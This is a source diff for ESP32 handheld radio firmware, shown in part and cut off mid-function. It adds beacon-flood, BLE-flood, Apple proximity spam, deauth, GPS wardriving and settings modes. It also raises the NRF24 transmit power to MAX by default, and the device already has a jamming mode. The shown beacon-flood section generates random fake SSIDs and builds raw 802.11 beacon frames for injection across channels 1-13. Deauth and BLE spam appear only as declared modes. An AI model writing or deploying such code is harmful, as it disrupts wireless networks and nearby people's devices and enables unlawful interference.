@@ -21,6 +21,8 @@
 // custom sdkconfig build. BT energy is still detected via NRF24 RPD on ch 2-80.
 #include "esp_wifi.h"
 #include "Preferences.h"
+#include <WiFi.h>
+#include <WebServer.h>
 #include <Arduino_GFX_Library.h>
 #include "TCA9554.h"
 #include "XPowersLib.h"
@@ -108,6 +110,14 @@ Arduino_GFX *gfx = new Arduino_ST7796(bus, GFX_NOT_DEFINED, 1 /*rotation*/, true
 #define COL_NETSCAN   0xEFE0u  // bright yellow-green — network scanner
 #define COL_WARDRIVE  0x07E3u  // lime-green — wardrive
 #define COL_LOGS      0xFCC0u  // amber — logs viewer
+#define COL_BEACON    0xF81Fu  // magenta — beacon flood
+#define COL_BTFLOOD   0x041Fu  // deep blue — BLE flood
+#define COL_APPLE     0xFFFFu  // white — Apple proximity spam
+#define COL_DEAUTH    0xF800u  // red — 802.11 deauth
+#define COL_SETTINGS  0x7BEFu  // blue-gray — settings
+#define COL_SIGNAL    0x07FFu  // cyan — signal meter
+#define COL_GPS       0x07E0u  // green — GPS wardrive
+#define COL_FLOCK     0xFD20u  // amber-red — passive Flock detector
 #define COL_LABEL    0xC618u  // light gray — readable labels
 #define COL_SECONDARY 0xAD75u // silver — secondary text, MACs
 #define COL_DIVIDER  0x4A49u  // medium gray — separator lines
@@ -120,6 +130,7 @@ bool radioBok = false;
 SPIClass spiHSPI(HSPI);
 RF24 radioA(NRF_CE_A, NRF_CSN_A, SPI_SPEED);
 RF24 radioB(NRF_CE_B, NRF_CSN_B, SPI_SPEED);
+uint8_t radioPaSetting = 2;  // 0=LOW, 1=HIGH, 2=MAX
 
 // Classic Bluetooth sweep counters (NRF24 ch 2–80)
 static uint8_t btSweepA = 2;
@@ -143,7 +154,9 @@ uint8_t gComboSpectrumPrev[126]= {0};
 // ---------------------------------------------------------------------------
 // Mode
 // ---------------------------------------------------------------------------
-enum Mode { OFF, WIFI, BLUETOOTH, BLE, JAMTIME, SPECTRUM, NETSCAN, WARDRIVE, LOGS };
+enum Mode { OFF, WIFI, BLUETOOTH, BLE, JAMTIME, SPECTRUM, NETSCAN, WARDRIVE, LOGS,
+            BEACON_FLOOD, BT_FLOOD, APPLE_SPAM, DEAUTH, SETTINGS, SIGNAL_METER,
+            GPS_WARDRIVE, FLOCK_DETECTOR };
 Mode currentMode = OFF;
 
 String inputString = "";
@@ -156,6 +169,14 @@ void drawSpectrumUI();
 void runSpectrum();
 void drawNetScanUI();
 void runNetScan();
+void drawSettingsUI();
+void runSettings();
+void drawSignalMeterUI();
+void runSignalMeter();
+void drawGpsWardriveUI();
+void runGpsWardrive();
+void drawFlockDetectorUI();
+void runFlockDetector();
 
 // ---------------------------------------------------------------------------
 // UI layout — 6 buttons in a 2×3 grid, landscape 480×320
@@ -175,20 +196,32 @@ struct Button {
   Mode mode;
 };
 
-// Page 0: 6 core mode buttons  |  Page 1: WARDRIVE + LOGS
-// Buttons 6-7 share the same screen positions as 0-1 but on page 1.
-static Button buttons[8] = {
+// Page 0: 6 core mode buttons | Page 1: aux/TX modes | Page 2: tools.
+static Button buttons[18] = {
   {0,       TITLE_H,         BTN_W, BTN_H, COL_WIFI,     "WIFI 2.4",  WIFI},
   {BTN_W,   TITLE_H,         BTN_W, BTN_H, COL_BLE,      "BLE",       BLE},
   {2*BTN_W, TITLE_H,         BTN_W, BTN_H, COL_BT,       "BLUETOOTH", BLUETOOTH},
   {0,       TITLE_H + BTN_H, BTN_W, BTN_H, COL_JAM,      "JAM TIME",  JAMTIME},
   {BTN_W,   TITLE_H + BTN_H, BTN_W, BTN_H, COL_SPECTRUM, "SPECTRUM",  SPECTRUM},
   {2*BTN_W, TITLE_H + BTN_H, BTN_W, BTN_H, COL_NETSCAN,  "NET SCAN",  NETSCAN},
-  // Page 1 — same screen coords as buttons 0 and 1
+  // Page 1 row 1
   {0,       TITLE_H,         BTN_W, BTN_H, COL_WARDRIVE, "WARDRIVE",  WARDRIVE},
   {BTN_W,   TITLE_H,         BTN_W, BTN_H, COL_LOGS,     "LOGS",      LOGS},
+  {2*BTN_W, TITLE_H,         BTN_W, BTN_H, COL_BEACON,   "BCN FLOOD", BEACON_FLOOD},
+  // Page 1 row 2
+  {0,       TITLE_H + BTN_H, BTN_W, BTN_H, COL_BTFLOOD,  "BT FLOOD",  BT_FLOOD},
+  {BTN_W,   TITLE_H + BTN_H, BTN_W, BTN_H, COL_APPLE,    "APPLE SPAM",APPLE_SPAM},
+  {2*BTN_W, TITLE_H + BTN_H, BTN_W, BTN_H, COL_DEAUTH,   "DEAUTH",    DEAUTH},
+  // Page 2 row 1
+  {0,       TITLE_H,         BTN_W, BTN_H, COL_SETTINGS, "SETTINGS",  SETTINGS},
+  {BTN_W,   TITLE_H,         BTN_W, BTN_H, COL_SIGNAL,   "SIGNAL",    SIGNAL_METER},
+  {2*BTN_W, TITLE_H,         BTN_W, BTN_H, COL_GPS,      "GPS DRIVE", GPS_WARDRIVE},
+  // Page 2 row 2
+  {0,       TITLE_H + BTN_H, BTN_W, BTN_H, COL_FLOCK,    "FLOCK DETECT", FLOCK_DETECTOR},
+  {BTN_W,   TITLE_H + BTN_H, BTN_W, BTN_H, COL_BG,       "",          OFF},
+  {2*BTN_W, TITLE_H + BTN_H, BTN_W, BTN_H, COL_BG,       "",          OFF},
 };
-static int uiPage = 0;  // 0 = main grid, 1 = extended (wardrive/logs)
+static int uiPage = 0;  // 0 = main grid, 1 = extended, 2 = tools
 
 // ---------------------------------------------------------------------------
 // Wardrive — device tables, scan state, SD logging
@@ -316,6 +349,24 @@ static const char *authLabel(uint8_t auth);
 bool deviceOn = true;
 unsigned long lastPowerBtnMs = 0;
 
+// ---------------------------------------------------------------------------
+// Battery telemetry — AXP2101 PMIC
+// ---------------------------------------------------------------------------
+#define BATTERY_POLL_MS 2000
+struct BatteryStatus {
+  bool available;
+  bool connected;
+  bool charging;
+  bool vbusIn;
+  int percent;
+  uint16_t battMv;
+  uint16_t vbusMv;
+  uint16_t sysMv;
+};
+BatteryStatus batteryStatus = {false, false, false, false, -1, 0, 0, 0};
+unsigned long lastBatteryPollMs = 0;
+bool titleBarHasBackButton = false;
+
 void powerOff() {
   activateMode(OFF);
   if (radioAok) { selectRadioA(); radioA.stopConstCarrier(); radioA.powerDown(); }
@@ -347,6 +398,91 @@ void handlePowerButton() {
   deviceOn ? powerOff() : powerOn();
 }
 
+uint16_t batteryColor(int percent, bool charging) {
+  if (charging) return COL_GREEN;
+  if (percent < 0) return COL_SECONDARY;
+  if (percent <= 15) return COL_RED;
+  if (percent <= 35) return COL_JAM;
+  return COL_GREEN;
+}
+
+void pollBattery(bool force = false) {
+  if (!pmuOk) {
+    batteryStatus.available = false;
+    return;
+  }
+
+  unsigned long now = millis();
+  if (!force && now - lastBatteryPollMs < BATTERY_POLL_MS) return;
+  lastBatteryPollMs = now;
+
+  batteryStatus.available = true;
+  batteryStatus.connected = PMU.isBatteryConnect();
+  batteryStatus.charging  = PMU.isCharging();
+  batteryStatus.vbusIn    = PMU.isVbusIn();
+  batteryStatus.percent   = batteryStatus.connected ? PMU.getBatteryPercent() : -1;
+  if (batteryStatus.percent > 100) batteryStatus.percent = 100;
+  batteryStatus.battMv    = PMU.getBattVoltage();
+  batteryStatus.vbusMv    = PMU.getVbusVoltage();
+  batteryStatus.sysMv     = PMU.getSystemVoltage();
+}
+
+void drawBatteryWidget() {
+  pollBattery();
+
+  const int x = titleBarHasBackButton ? 70 : 6;
+  const int y = 9;
+  const int w = 34;
+  const int h = 16;
+  gfx->fillRect(x - 1, 0, 95, TITLE_H, COL_BG);
+
+  uint16_t col = batteryColor(batteryStatus.percent, batteryStatus.charging);
+  gfx->drawRect(x, y, w, h, batteryStatus.available ? COL_LABEL : COL_RED);
+  gfx->fillRect(x + w, y + 5, 3, 6, batteryStatus.available ? COL_LABEL : COL_RED);
+
+  if (batteryStatus.available && batteryStatus.connected && batteryStatus.percent >= 0) {
+    int fillW = map(batteryStatus.percent, 0, 100, 0, w - 4);
+    gfx->fillRect(x + 2, y + 2, fillW, h - 4, col);
+  }
+
+  gfx->setTextSize(1);
+  gfx->setTextColor(col);
+  gfx->setCursor(x + 43, 8);
+  if (!batteryStatus.available) {
+    gfx->print("PMU?");
+  } else if (!batteryStatus.connected) {
+    gfx->print("NO BAT");
+  } else {
+    char label[12];
+    snprintf(label, sizeof(label), "%d%%%c", batteryStatus.percent,
+             batteryStatus.vbusIn ? '+' : ' ');
+    gfx->print(label);
+  }
+}
+
+void refreshBatteryWidget() {
+  unsigned long before = lastBatteryPollMs;
+  pollBattery();
+  if (lastBatteryPollMs != before) drawBatteryWidget();
+}
+
+void printBatteryStatus() {
+  pollBattery(true);
+  if (!batteryStatus.available) {
+    Serial.println("Battery: PMU not detected");
+    return;
+  }
+  Serial.printf("Battery: %s", batteryStatus.connected ? "connected" : "not connected");
+  if (batteryStatus.connected) {
+    Serial.printf(", %d%%, %umV", batteryStatus.percent, batteryStatus.battMv);
+  }
+  Serial.printf(", USB/VBUS: %s", batteryStatus.vbusIn ? "in" : "not present");
+  if (batteryStatus.vbusMv > 0) Serial.printf(" (%umV)", batteryStatus.vbusMv);
+  Serial.printf(", charging: %s", batteryStatus.charging ? "yes" : "no");
+  if (batteryStatus.sysMv > 0) Serial.printf(", system: %umV", batteryStatus.sysMv);
+  Serial.println();
+}
+
 // ---------------------------------------------------------------------------
 // Touch state
 // ---------------------------------------------------------------------------
@@ -365,14 +501,25 @@ String getModeString(Mode mode) {
     case JAMTIME:   return "JAMTIME";
     case SPECTRUM:  return "SPECTRUM";
     case NETSCAN:   return "NETSCAN";
-    case WARDRIVE:  return "WARDRIVE";
-    case LOGS:      return "LOGS";
-    default:        return "UNKNOWN";
+    case WARDRIVE:     return "WARDRIVE";
+    case LOGS:         return "LOGS";
+    case BEACON_FLOOD: return "BEACON_FLOOD";
+    case BT_FLOOD:     return "BT_FLOOD";
+    case APPLE_SPAM:   return "APPLE_SPAM";
+    case DEAUTH:       return "DEAUTH";
+    case SETTINGS:     return "SETTINGS";
+    case SIGNAL_METER: return "SIGNAL_METER";
+    case GPS_WARDRIVE: return "GPS_WARDRIVE";
+    case FLOCK_DETECTOR: return "FLOCK_DETECTOR";
+    default:           return "UNKNOWN";
   }
 }
 
 void saveDefaultMode(Mode mode) {
-  if (mode == SPECTRUM || mode == NETSCAN || mode == WARDRIVE || mode == LOGS) return;
+  if (mode == SPECTRUM || mode == NETSCAN || mode == WARDRIVE || mode == LOGS ||
+      mode == BEACON_FLOOD || mode == BT_FLOOD || mode == APPLE_SPAM || mode == DEAUTH ||
+      mode == SETTINGS || mode == SIGNAL_METER || mode == GPS_WARDRIVE ||
+      mode == FLOCK_DETECTOR) return;
   preferences.begin("rfclown", false);
   preferences.putUChar("mode", (uint8_t)mode);
   preferences.end();
@@ -391,7 +538,8 @@ void sendCurrentMode() { }
 // Display helpers
 // ---------------------------------------------------------------------------
 void drawStatusDots() {
-  // Three persistent indicators: SD | Radio A | Radio B
+  // Persistent indicators: battery | SD | Radio A | Radio B
+  drawBatteryWidget();
   gfx->fillCircle(416, 17, 6, sdOk    ? COL_GREEN : COL_RED);
   gfx->fillCircle(436, 17, 6, radioAok ? COL_GREEN : COL_RED);
   gfx->fillCircle(456, 17, 6, radioBok ? COL_GREEN : COL_RED);
@@ -403,6 +551,7 @@ void drawStatusDots() {
 }
 
 void drawTitleBar() {
+  titleBarHasBackButton = false;
   gfx->fillRect(0, 0, 480, TITLE_H, COL_BG);
   gfx->setTextColor(COL_TITLE);
   gfx->setTextSize(2);
@@ -415,7 +564,9 @@ void drawTitleBar() {
   gfx->setTextSize(1);
   gfx->setTextColor(COL_LABEL);
   gfx->setCursor(397, 16);
-  gfx->print(uiPage == 0 ? "\x1a" : "\x1b");  // → or ←  (ASCII 26/27)
+  char pg[8];
+  snprintf(pg, sizeof(pg), "%d/3", uiPage + 1);
+  gfx->print(pg);
 }
 
 static bool isJamMode(Mode m) {
@@ -424,6 +575,11 @@ static bool isJamMode(Mode m) {
 
 void drawButton(int idx, bool active) {
   const Button &b = buttons[idx];
+  if (!b.label[0]) {
+    gfx->fillRect(b.x, b.y, b.w, b.h, COL_BG);
+    gfx->drawRect(b.x, b.y, b.w, b.h, COL_DIVIDER);
+    return;
+  }
   uint16_t border = active ? COL_ACTIVE : COL_DIVIDER;
   uint16_t fill   = active ? b.color : (uint16_t)(((b.color >> 1) & 0x7BEF) | 0x2108);
 
@@ -449,16 +605,9 @@ void drawUI() {
     for (int i = 0; i < 6; i++)
       drawButton(i, buttons[i].mode == currentMode);
   } else {
-    // Page 1: WARDRIVE (slot 0) + LOGS (slot 1)
-    drawButton(6, buttons[6].mode == currentMode);
-    drawButton(7, buttons[7].mode == currentMode);
-    // Empty third slot and entire second row
-    gfx->fillRect(2*BTN_W, TITLE_H, BTN_W, BTN_H, COL_BG);
-    gfx->drawRect(2*BTN_W, TITLE_H, BTN_W, BTN_H, COL_DIVIDER);
-    for (int c = 0; c < 3; c++) {
-      gfx->fillRect(c*BTN_W, TITLE_H + BTN_H, BTN_W, BTN_H, COL_BG);
-      gfx->drawRect(c*BTN_W, TITLE_H + BTN_H, BTN_W, BTN_H, COL_DIVIDER);
-    }
+    int start = uiPage * 6;
+    for (int i = start; i < start + 6; i++)
+      drawButton(i, buttons[i].mode == currentMode);
   }
 }
 
@@ -467,8 +616,9 @@ void refreshButtons() {
     for (int i = 0; i < 6; i++)
       drawButton(i, buttons[i].mode == currentMode);
   } else {
-    drawButton(6, buttons[6].mode == currentMode);
-    drawButton(7, buttons[7].mode == currentMode);
+    int start = uiPage * 6;
+    for (int i = start; i < start + 6; i++)
+      drawButton(i, buttons[i].mode == currentMode);
   }
 }
 
@@ -523,9 +673,10 @@ bool configureRadio(RF24 &radio, RadioSelectFn selectRadio) {
     radio.setAutoAck(false);
     radio.stopListening();
     radio.setRetries(0, 0);
-    // PA_HIGH (-6dBm chip out, still huge through PA+LNA) — PA_MAX peak current
-    // sags the shared 3.3V rail enough to brown out the sibling radio.
-    radio.setPALevel(RF24_PA_HIGH, true);
+    rf24_pa_dbm_e pa = RF24_PA_MAX;
+    if (radioPaSetting == 0) pa = RF24_PA_LOW;
+    else if (radioPaSetting == 1) pa = RF24_PA_HIGH;
+    radio.setPALevel(pa, true);
     radio.setDataRate(RF24_2MBPS);
     radio.setCRCLength(RF24_CRC_DISABLED);
     radio.setPayloadSize(32);
@@ -1153,6 +1304,1040 @@ void drawLogsUI() {
   else                  drawLogsEntries();
 }
 
+// ===========================================================================
+//  SETTINGS — local defaults and radio behavior
+// ===========================================================================
+static const Mode settingsDefaultModes[] = {OFF, WIFI, BLE, BLUETOOTH, JAMTIME};
+static const char *settingsDefaultLabels[] = {"OFF", "WIFI", "BLE", "BT", "JAM"};
+static const char *settingsPaLabels[] = {"LOW", "HIGH", "MAX"};
+#define SETTINGS_DEFAULT_COUNT 5
+
+static int settingsDefaultIndex() {
+  Mode m = loadDefaultMode();
+  for (int i = 0; i < SETTINGS_DEFAULT_COUNT; i++)
+    if (settingsDefaultModes[i] == m) return i;
+  return 0;
+}
+
+static void settingsSavePa() {
+  preferences.begin("rfclown", false);
+  preferences.putUChar("pa", radioPaSetting);
+  preferences.end();
+}
+
+static void settingsDrawRow(int row, const char *label, const char *value, uint16_t col) {
+  int y = TITLE_H + 18 + row * 42;
+  gfx->fillRect(0, y, 480, 38, (row & 1) ? 0x0820 : 0x0000);
+  gfx->setTextSize(2);
+  gfx->setTextColor(COL_LABEL);
+  gfx->setCursor(12, y + 10); gfx->print(label);
+  gfx->setTextColor(col);
+  gfx->setCursor(270, y + 10); gfx->print(value);
+}
+
+void drawSettingsUI() {
+  gfx->fillScreen(0x0000);
+  gfx->fillRect(0, 0, 480, TITLE_H, 0x0000);
+  drawBackButton();
+  gfx->setTextColor(COL_SETTINGS); gfx->setTextSize(2);
+  const char *t = "SETTINGS";
+  gfx->setCursor((480 - (int)strlen(t) * 12) / 2, (TITLE_H - 16) / 2);
+  gfx->print(t);
+  drawStatusDots();
+
+  int defIdx = settingsDefaultIndex();
+  settingsDrawRow(0, "DEFAULT MODE", settingsDefaultLabels[defIdx], COL_ACTIVE);
+  settingsDrawRow(1, "RADIO PA", settingsPaLabels[radioPaSetting], COL_SIGNAL);
+
+  pollBattery(true);
+  char bat[32];
+  if (batteryStatus.connected)
+    snprintf(bat, sizeof(bat), "%d%% %umV", batteryStatus.percent, batteryStatus.battMv);
+  else
+    snprintf(bat, sizeof(bat), "NO BAT");
+  settingsDrawRow(2, "BATTERY", bat, batteryColor(batteryStatus.percent, batteryStatus.charging));
+  settingsDrawRow(3, "USB POWER", batteryStatus.vbusIn ? "YES" : "NO", batteryStatus.vbusIn ? COL_GREEN : COL_SECONDARY);
+  settingsDrawRow(4, "SYSTEM", batteryStatus.sysMv ? String(batteryStatus.sysMv).c_str() : "N/A", COL_LABEL);
+
+  gfx->setTextSize(1);
+  gfx->setTextColor(COL_SECONDARY);
+  gfx->setCursor(12, 300);
+  gfx->print("Tap a row to cycle. PA applies after radio reconfigure or reboot.");
+}
+
+void runSettings() {
+  static unsigned long lastDraw = 0;
+  if (millis() - lastDraw >= 3000) {
+    lastDraw = millis();
+    drawSettingsUI();
+  }
+}
+
+// ===========================================================================
+//  SIGNAL METER — select an AP and graph RSSI over time
+// ===========================================================================
+#define SIG_MAX_AP      12
+#define SIG_HIST        80
+#define SIG_SCAN_MS   2500
+struct SigAp {
+  char ssid[33];
+  uint8_t bssid[6];
+  int8_t rssi;
+  uint8_t channel;
+};
+static SigAp sigAps[SIG_MAX_AP];
+static uint8_t sigCount = 0;
+static int8_t sigSel = -1;
+static int8_t sigLastRssi = -127;
+static int8_t sigHistory[SIG_HIST] = {};
+static uint8_t sigHistPos = 0;
+static unsigned long sigLastScanMs = 0;
+
+static void signalPushRssi(int8_t rssi) {
+  sigHistory[sigHistPos] = rssi;
+  sigHistPos = (sigHistPos + 1) % SIG_HIST;
+}
+
+static void signalDrawGraph() {
+  const int gx = 8, gy = 176, gw = 464, gh = 96;
+  gfx->fillRect(gx, gy, gw, gh, 0x0000);
+  gfx->drawRect(gx, gy, gw, gh, COL_DIVIDER);
+  for (int i = 0; i < SIG_HIST; i++) {
+    int idx = (sigHistPos + i) % SIG_HIST;
+    int8_t r = sigHistory[idx];
+    if (r == 0) continue;
+    int x = gx + 2 + i * (gw - 4) / SIG_HIST;
+    int y = map(constrain((int)r, -100, -35), -100, -35, gy + gh - 3, gy + 3);
+    gfx->drawFastVLine(x, y, gy + gh - 2 - y, COL_SIGNAL);
+  }
+  gfx->setTextSize(1);
+  gfx->setTextColor(COL_SECONDARY);
+  gfx->setCursor(gx + 4, gy + 4); gfx->print("-35");
+  gfx->setCursor(gx + 4, gy + gh - 12); gfx->print("-100");
+}
+
+static void signalDrawList() {
+  gfx->fillRect(0, TITLE_H, 480, 132, 0x0000);
+  for (int i = 0; i < min((int)sigCount, 6); i++) {
+    int y = TITLE_H + i * 22;
+    bool sel = (sigSel == i);
+    gfx->fillRect(0, y, 480, 22, sel ? 0x0320 : ((i & 1) ? 0x0820 : 0x0000));
+    gfx->setTextSize(1);
+    gfx->setTextColor(sel ? COL_ACTIVE : COL_TITLE);
+    char nm[25]; strncpy(nm, sigAps[i].ssid[0] ? sigAps[i].ssid : "<hidden>", 24); nm[24] = '\0';
+    gfx->setCursor(8, y + 7); gfx->print(nm);
+    char info[32];
+    snprintf(info, sizeof(info), "%4d dBm  ch%d", sigAps[i].rssi, sigAps[i].channel);
+    gfx->setTextColor(sel ? COL_ACTIVE : COL_SECONDARY);
+    gfx->setCursor(310, y + 7); gfx->print(info);
+  }
+  if (sigCount == 0) {
+    gfx->setTextColor(COL_LABEL); gfx->setTextSize(1);
+    gfx->setCursor(180, TITLE_H + 55); gfx->print("Scanning APs...");
+  }
+}
+
+static void signalDrawStatus() {
+  gfx->fillRect(0, 274, 480, 46, 0x0000);
+  gfx->setTextSize(2);
+  if (sigSel >= 0 && sigSel < sigCount) {
+    gfx->setTextColor(COL_SIGNAL);
+    gfx->setCursor(12, 286); gfx->print(sigAps[sigSel].ssid[0] ? sigAps[sigSel].ssid : "<hidden>");
+    char r[20]; snprintf(r, sizeof(r), "%d dBm", sigLastRssi);
+    gfx->setTextColor(COL_ACTIVE);
+    gfx->setCursor(340, 286); gfx->print(r);
+  } else {
+    gfx->setTextColor(COL_LABEL);
+    gfx->setCursor(90, 286); gfx->print("Tap an AP to track RSSI");
+  }
+}
+
+void drawSignalMeterUI() {
+  gfx->fillScreen(0x0000);
+  gfx->fillRect(0, 0, 480, TITLE_H, 0x0000);
+  drawBackButton();
+  gfx->setTextColor(COL_SIGNAL); gfx->setTextSize(2);
+  const char *t = "SIGNAL METER";
+  gfx->setCursor((480 - (int)strlen(t) * 12) / 2, (TITLE_H - 16) / 2);
+  gfx->print(t);
+  drawStatusDots();
+  signalDrawList();
+  signalDrawGraph();
+  signalDrawStatus();
+}
+
+static void signalScan() {
+  int n = WiFi.scanNetworks(false, true, false, 250);
+  if (n < 0) return;
+  if (n > SIG_MAX_AP) n = SIG_MAX_AP;
+  sigCount = n;
+  for (int i = 0; i < n; i++) {
+    strncpy(sigAps[i].ssid, WiFi.SSID(i).c_str(), 32); sigAps[i].ssid[32] = '\0';
+    memcpy(sigAps[i].bssid, WiFi.BSSID(i), 6);
+    sigAps[i].rssi = WiFi.RSSI(i);
+    sigAps[i].channel = WiFi.channel(i);
+  }
+  if (sigSel >= sigCount) sigSel = -1;
+  if (sigSel >= 0) {
+    sigLastRssi = sigAps[sigSel].rssi;
+    signalPushRssi(sigLastRssi);
+  }
+  WiFi.scanDelete();
+  signalDrawList();
+  signalDrawGraph();
+  signalDrawStatus();
+}
+
+void runSignalMeter() {
+  if (millis() - sigLastScanMs >= SIG_SCAN_MS) {
+    sigLastScanMs = millis();
+    signalScan();
+  }
+}
+
+// ===========================================================================
+//  GPS WARDRIVE — phone geolocation bridge over local WiFi AP
+// ===========================================================================
+#define GPS_SCAN_MS 8000
+WebServer gpsServer(80);
+static bool gpsServerRunning = false;
+static bool gpsFixValid = false;
+static double gpsLat = 0.0, gpsLon = 0.0, gpsAcc = 0.0;
+static unsigned long gpsFixMs = 0, gpsLastScanMs = 0;
+static uint32_t gpsLogged = 0;
+static char gpsLogFile[40] = {};
+
+static const char gpsPage[] =
+"<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
+"<style>body{font-family:sans-serif;background:#050505;color:#eee;margin:20px}"
+"button{font-size:20px;padding:12px 16px;margin:6px 0}input{font-size:18px;width:96%;padding:10px;margin:5px 0}"
+"#s{margin-top:18px;font-size:18px}.hint{color:#bbb;line-height:1.35}</style>"
+"<h2>GIZMO GPS</h2><button onclick='go()'>Start Browser GPS</button><div id=s>Idle</div>"
+"<p class=hint>Phones usually block browser GPS on this HTTP page. If blocked, use a phone shortcut/app to call "
+"<code>http://192.168.4.1/gps?lat=LAT&lon=LON&acc=ACC</code>, or paste coordinates below.</p>"
+"<input id=lat placeholder='Latitude'><input id=lon placeholder='Longitude'><input id=acc placeholder='Accuracy meters'>"
+"<button onclick='manual()'>Send Manual Fix</button>"
+"<script>function send(lat,lon,acc){fetch('/gps?lat='+encodeURIComponent(lat)+'&lon='+encodeURIComponent(lon)+'&acc='+(acc||0))"
+".then(()=>s.textContent='Sent '+Number(lat).toFixed(6)+','+Number(lon).toFixed(6)+' +/- '+Math.round(acc||0)+'m')}"
+"function manual(){send(lat.value,lon.value,acc.value)}"
+"let w;function go(){if(!navigator.geolocation){s.textContent='No geolocation';return}"
+"w=navigator.geolocation.watchPosition(p=>{let c=p.coords;"
+"send(c.latitude,c.longitude,c.accuracy||0)},"
+"e=>s.textContent='Browser blocked GPS: '+e.message,{enableHighAccuracy:true,maximumAge:1000,timeout:10000})}</script>";
+
+static void gpsHandleRoot() {
+  gpsServer.send(200, "text/html", gpsPage);
+}
+
+static void gpsHandleFix() {
+  if (gpsServer.hasArg("lat") && gpsServer.hasArg("lon")) {
+    gpsLat = gpsServer.arg("lat").toDouble();
+    gpsLon = gpsServer.arg("lon").toDouble();
+    gpsAcc = gpsServer.hasArg("acc") ? gpsServer.arg("acc").toDouble() : 0.0;
+    gpsFixMs = millis();
+    gpsFixValid = true;
+    gpsServer.send(200, "text/plain", "OK");
+  } else {
+    gpsServer.send(400, "text/plain", "missing lat/lon");
+  }
+}
+
+static void gpsDrawStatus() {
+  gfx->fillRect(0, TITLE_H, 480, 280, 0x0000);
+  gfx->setTextSize(2);
+  gfx->setTextColor(COL_GPS);
+  gfx->setCursor(14, 54); gfx->print("Phone AP: GIZMO-GPS");
+  gfx->setTextColor(COL_LABEL);
+  gfx->setCursor(14, 84); gfx->print("Open: 192.168.4.1");
+
+  gfx->setTextSize(1);
+  gfx->setCursor(14, 124);
+  gfx->setTextColor(gpsFixValid ? COL_GREEN : COL_RED);
+  gfx->print(gpsFixValid ? "GPS FIX RECEIVED" : "WAITING FOR PHONE GPS");
+  if (gpsFixValid) {
+    char line[64];
+    snprintf(line, sizeof(line), "Lat %.6f", gpsLat);
+    gfx->setTextColor(COL_TITLE); gfx->setCursor(14, 146); gfx->print(line);
+    snprintf(line, sizeof(line), "Lon %.6f  Acc %.0fm", gpsLon, gpsAcc);
+    gfx->setCursor(14, 162); gfx->print(line);
+    snprintf(line, sizeof(line), "Age %lus", (millis() - gpsFixMs) / 1000);
+    gfx->setCursor(14, 178); gfx->print(line);
+  }
+  char st[64];
+  snprintf(st, sizeof(st), "Logged:%lu  SD:%s", (unsigned long)gpsLogged, sdOk ? "OK" : "NO");
+  gfx->setTextColor(sdOk ? COL_GREEN : COL_RED);
+  gfx->setCursor(14, 220); gfx->print(st);
+  gfx->setTextColor(COL_SECONDARY);
+  gfx->setCursor(14, 252); gfx->print("WiFi scans are logged with latest phone GPS fix.");
+}
+
+void drawGpsWardriveUI() {
+  gfx->fillScreen(0x0000);
+  gfx->fillRect(0, 0, 480, TITLE_H, 0x0000);
+  drawBackButton();
+  gfx->setTextColor(COL_GPS); gfx->setTextSize(2);
+  const char *t = "GPS WARDRIVE";
+  gfx->setCursor((480 - (int)strlen(t) * 12) / 2, (TITLE_H - 16) / 2);
+  gfx->print(t);
+  drawStatusDots();
+  gpsDrawStatus();
+}
+
+static void gpsAppendWifi(const wifi_ap_record_t &r) {
+  if (!sdOk || !gpsLogFile[0]) return;
+  File f = SD_MMC.open(gpsLogFile, FILE_APPEND);
+  if (!f) return;
+  char mac[18]; macToStr(r.bssid, mac);
+  f.printf("%lu,%.6f,%.6f,%.1f,%s,%s,%d,%d,%d\n",
+           millis(), gpsLat, gpsLon, gpsAcc, (char *)r.ssid, mac,
+           (int)r.rssi, (int)r.primary, (int)r.authmode);
+  f.close();
+  gpsLogged++;
+}
+
+static void gpsScanWifi() {
+  wifi_scan_config_t sc = {};
+  sc.show_hidden = 1;
+  sc.scan_type = WIFI_SCAN_TYPE_ACTIVE;
+  sc.scan_time.active.min = 50;
+  sc.scan_time.active.max = 150;
+  esp_wifi_scan_start(&sc, true);
+  uint16_t count = 0; esp_wifi_scan_get_ap_num(&count);
+  if (count > 30) count = 30;
+  wifi_ap_record_t *recs = (wifi_ap_record_t *)malloc(count * sizeof(wifi_ap_record_t));
+  if (recs) {
+    esp_wifi_scan_get_ap_records(&count, recs);
+    for (int i = 0; i < (int)count; i++) gpsAppendWifi(recs[i]);
+    free(recs);
+  }
+  gpsDrawStatus();
+}
+
+void runGpsWardrive() {
+  if (gpsServerRunning) gpsServer.handleClient();
+  if (millis() - gpsLastScanMs >= GPS_SCAN_MS) {
+    gpsLastScanMs = millis();
+    gpsScanWifi();
+  }
+}
+
+// ===========================================================================
+//  BEACON FLOOD — raw 802.11 beacon injection via esp_wifi_80211_tx
+//  Floods the 2.4 GHz band with fake SSIDs across channels 1-13.
+//  Uses ESP32 internal WiFi (AP mode) independent of the NRF24 radios.
+// ===========================================================================
+
+#define BF_STATS_H   38
+#define BF_LIST_TOP  (TITLE_H + BF_STATS_H + 2)   // y=80
+#define BF_ROW_H     22
+#define BF_SSID_LOG  10
+#define BF_HOP_EVERY 20
+#define BF_VISIBLE   ((320 - BF_LIST_TOP) / BF_ROW_H)  // 10 rows
+
+static uint32_t      bfCount       = 0;
+static uint8_t       bfChannel     = 1;
+static uint8_t       bfPerChannel  = 0;
+static uint32_t      bfRateCount   = 0;
+static uint16_t      bfRate        = 0;
+static unsigned long bfLastRateMs  = 0;
+static unsigned long bfLastDrawMs  = 0;
+static char          bfSsidLog[BF_SSID_LOG][33] = {};
+static uint8_t       bfSsidHead    = 0;
+
+static const char *bfPrefixes[] = {
+  "FBI_VAN_", "NSA_NODE_", "XFINITY_", "ATT_WIFI_", "SKYNET_",
+  "FREE_WIFI_", "5G_TOWER_", "GUEST_NET_", "IOT_DEV_",
+  "SMART_TV_", "RING_CAM_", "CORP_SEC_", "HOME_AP_",
+  "TESLA_WPA_", "HIDDEN_NET_"
+};
+#define BF_NUM_PREFIXES 15
+
+static void bfMakeSSID(char *out) {
+  int pi = esp_random() % BF_NUM_PREFIXES;
+  sprintf(out, "%s%04X", bfPrefixes[pi], (unsigned)(esp_random() & 0xFFFF));
+}
+
+static void bfBuildFrame(uint8_t *buf, int &len, const char *ssid, uint8_t ch) {
+  buf[0] = 0x80; buf[1] = 0x00;   // FC: beacon
+  buf[2] = 0x00; buf[3] = 0x00;   // duration
+  memset(buf + 4, 0xFF, 6);        // DA: broadcast
+  // SA: random locally-administered unicast MAC
+  uint32_t r1 = esp_random(), r2 = esp_random();
+  buf[10] = 0x02;
